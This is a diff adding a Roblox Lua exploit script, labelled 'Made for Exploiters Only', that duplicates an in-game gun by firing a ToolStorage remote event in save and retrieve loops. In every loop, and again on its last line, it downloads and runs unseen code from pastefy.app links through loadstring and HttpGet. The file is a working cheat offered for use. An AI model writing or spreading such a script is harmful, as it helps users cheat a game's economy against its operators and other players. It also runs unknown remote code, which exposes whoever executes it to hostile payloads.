@@ -1,0 +1,102 @@
+--[[
+    🔫 Gun Duplication Exploit Script
+    ⚙️ Auto Loop: Load → Equip → Store → Repeat (10x) → Retrieve All (10x)
+    💀 Made for Exploiters Only
+]]
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local Backpack = LocalPlayer:WaitForChild("Backpack")
+
+-- ⚙️ Configuration
+local LOOP_COUNT = 10
+local LOOP_DELAY = 0.1
+local GUN_NAME = "Gun"
+local SCRIPT_URL = "https://pastefy.app/vVct4e1M/raw"
+
+-- 🛠️ Core Functions
+local function runExternalScript()
+    print("🔄 Loading external gun script...")
+    local success, err = pcall(function()
+        loadstring(game:HttpGet(SCRIPT_URL))()
+    end)
+    if not success then
+        warn("❌ Failed to load external script:", err)
+    end
+end
+
+local function waitForGunEquipped()
+    print("🔍 Waiting for Gun to be equipped...")
+    local attempts = 0
+    repeat
+        task.wait(0.1)
+        attempts = attempts + 1
+        if attempts > 50 then -- 5 seconds timeout
+            warn("⚠️ Gun equip timeout")
+            return false
+        end
+    until Character:FindFirstChild(GUN_NAME)
+    print("✅ Gun equipped!")
+    return true
+end
+
+local function unequipGun()
+    print("📦 Unequipping Gun...")
+    local gun = Character:FindFirstChild(GUN_NAME)
+    if gun then
+        gun.Parent = Backpack
+        task.wait(0.1)
+    end
+end
+
+local function saveGun()
+    print("💾 Saving Gun to storage...")
+    local args = {"Save", GUN_NAME}
+    ReplicatedStorage:WaitForChild("ToolStorage"):WaitForChild("ToolsStorage"):FireServer(unpack(args))
+end
+
+local function retrieveGun()
+    print("📥 Retrieving Gun from storage...")
+    local args = {"Get", GUN_NAME}
+    ReplicatedStorage:WaitForChild("ToolStorage"):WaitForChild("ToolsStorage"):FireServer(unpack(args))
+end
+
+-- 🎯 Main Execution
+print("🚀 Starting Gun Duplication Loop...")
+
+for i = 1, LOOP_COUNT do
+    print(string.format("🔁 Loop %d/%d", i, LOOP_COUNT))
+    
+    -- Step 1: Load external script
+    runExternalScript()
+    
+    -- Step 2: Wait for gun to be equipped
+    if waitForGunEquipped() then
+        -- Step 3: Unequip immediately
+        unequipGun()
+        
+        -- Step 4: Save to storage
+        saveGun()
+    else
+        warn("⚠️ Skipping loop due to equip failure")
+    end
+    
+    -- Step 5: Wait before next loop
+    task.wait(LOOP_DELAY)
+end
+
+print("✅ Duplication complete! Now retrieving all guns...")
+
+-- 🔥 Retrieve all guns rapidly
+for i = 1, LOOP_COUNT do
+    print(string.format("📥 Retrieving gun %d/%d", i, LOOP_COUNT))
+    retrieveGun()
+    task.wait(0.01) -- เร็วมาก
+end
+
+print("🎉 All done! Check your inventory 🔫")
+
+-- API ฟีาย
+loadstring(game:HttpGet("https://pastefy.app/lrsxhWje/raw"))()
